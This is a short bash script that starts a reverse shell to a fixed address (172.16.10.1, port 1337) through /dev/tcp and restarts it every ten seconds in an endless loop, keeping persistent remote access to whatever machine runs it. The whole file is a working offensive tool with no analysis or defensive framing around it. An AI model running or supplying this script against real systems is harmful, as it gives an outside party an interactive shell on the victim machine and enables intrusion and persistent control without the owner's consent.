#!/bin/bash
TARGET_HOST="172.16.10.1"
TARGET_PORT="1337"

restart_reverse_shell(){
    echo "Restarting reverse shell..."
    bash -i >& "/dev/tcp/${TARGET_HOST}/${TARGET_PORT}" 0>&1 &
}

while true; do
    restart_reverse_shell
    sleep 10
done
